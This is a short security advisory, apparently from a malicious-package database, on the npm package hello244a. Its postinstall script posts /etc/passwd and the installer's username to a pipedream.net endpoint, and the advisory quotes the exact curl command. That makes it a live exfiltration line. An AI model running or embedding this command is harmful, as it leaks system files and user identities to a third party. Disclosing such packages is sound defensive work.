summary: hello244a postinstall exfiltrates /etc/passwd and username to pipedream.net
details: The package ships only a package.json whose postinstall lifecycle script runs `curl --data '@/etc/passwd' $(whoami).eodxy50gl486xrx.m.pipedream.net`. On `npm install` this automatically reads the installer's /etc/passwd and POSTs its contents to a third-party request-inspector endpoint, with the installer's local username embedded as a subdomain for host reconnaissance. The tarball contains no source, README, or advertised functionality — the package's only effect is to run this exfiltration on install, consistent with a dependency-confusion or PoC squat targeting an internal package name.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
